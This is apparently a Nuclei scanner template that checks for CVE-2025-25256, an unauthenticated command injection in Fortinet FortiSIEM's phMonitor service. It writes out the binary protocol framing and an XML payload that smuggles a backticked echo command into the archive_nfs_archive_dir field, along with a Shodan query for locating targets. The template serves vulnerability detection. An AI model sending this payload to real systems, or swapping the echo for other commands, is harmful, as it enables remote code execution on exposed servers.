id: CVE-2025-25256

info:
  name: Fortinet FortiSIEM - OS Command Injection (CVE-2025-25256)
  author: intelligent-ears
  severity: critical
  description: |
    Fortinet FortiSIEM contains a critical OS command injection vulnerability in the phMonitor service
    running on port 7900. The vulnerability exists in CLI request processing where user-supplied input
    in XML parameters is not properly sanitized before being passed to system commands. This allows
    unauthenticated attackers to execute arbitrary OS commands remotely via crafted requests containing
    command injection payloads in backticks within the archive_nfs_archive_dir parameter.
  reference:
    - https://www.fortiguard.com/psirt/FG-IR-25-152
    - https://nvd.nist.gov/vuln/detail/CVE-2025-25256
    - https://github.com/barbaraeivyu/CVE-2025-25256
    - https://labs.watchtowr.com/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2025-25256
    cwe-id: CWE-78
    kev: true
  metadata:
    verified: true
    max-request: 1
    vendor: fortinet
    product: fortisiem
    shodan-query: "http.favicon.hash:-1341442175"
  tags: cve,cve2025,fortinet,fortisiem,rce,injection,kev,phmonitor

# The vulnerability exists in the SSL-wrapped phMonitor service on port 7900
# Protocol uses a 16-byte header followed by XML payload
# Header structure: [magic:4][length:4][magic2:4][padding:4] + XML_PAYLOAD
network:
  - inputs:
      - data: |
          @hex
          5a000000{{len(hex_encode(payload))}}40414f3f00000000{{hex_encode(payload)}}

    host:
      - "{{Hostname}}"
    port: 7900

    variables:
      payload: |
        <root>
            <archive_storage_type>nfs</archive_storage_type>
            <archive_nfs_server_ip>127.0.0.1</archive_nfs_server_ip>
            <archive_nfs_archive_dir>`echo {{randstr}}_nuclei_cve_2025_25256`</archive_nfs_archive_dir>
            <scope>local</scope>
        </root>

    matchers-condition: or
    matchers:
      # Successful command execution - look for our marker in response
      - type: regex
        name: command-executed
        regex:
          - "[a-zA-Z0-9]+_nuclei_cve_2025_25256"
        part: body

      # Service responds indicating FortiSIEM phMonitor presence
      - type: word
        name: fortisiem-service
        words:
          - "phMonitor"
          - "FortiSIEM"
          - "archive_storage_type"
        condition: or
        part: body

      # Error responses that confirm vulnerability exists
      - type: regex
        name: vulnerability-indicators
        regex:
          - "command not found"
          - "sh: .*: command not found"
          - "/bin/sh"
          - "bash:"
        part: body

    extractors:
      - type: regex
        name: command-output
        regex:
          - "[a-zA-Z0-9]+_nuclei_cve_2025_25256"
        part: body

      - type: regex  
        name: error-details
        regex:
          - "(command not found|sh: .*|bash:.*)"
        part: body

# Enhanced file information: this template is based on technical analysis of
# public PoCs from watchTowr Labs and barbaraeivyu, implementing the exact
# protocol structure and injection vector without causing system damage
